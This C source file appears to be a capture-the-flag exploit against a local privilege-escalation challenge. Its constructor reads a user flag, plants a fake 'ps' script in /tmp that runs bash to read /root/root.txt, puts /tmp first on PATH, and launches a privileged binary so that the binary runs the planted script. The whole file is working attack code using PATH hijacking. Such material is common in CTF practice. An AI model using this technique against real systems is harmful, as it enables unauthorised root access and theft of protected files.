#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

__attribute__((constructor))
void run() {
    char flag[64];

    FILE *fp = fopen("/home/kel/flag.txt", "r");

    fgets(flag, 64, fp);

    printf("IDENT ");
    printf("Flag 1: %s", flag);

    fclose(fp);

    fp = fopen("/tmp/ps", "w+");
    fputs("#!/bin/sh\n/bin/bash -i -c '/bin/cat /root/root.txt'", fp);
    fclose(fp);

    chmod("/tmp/ps", S_IRWXU);
    setenv("PATH", "/tmp:/bin:/usr/bin", 1);

    fp = popen("/home/kel/exe", "r");

    fgets(flag, 64, fp);

    printf("Flag 2: %s", flag);
    fclose(fp);
}
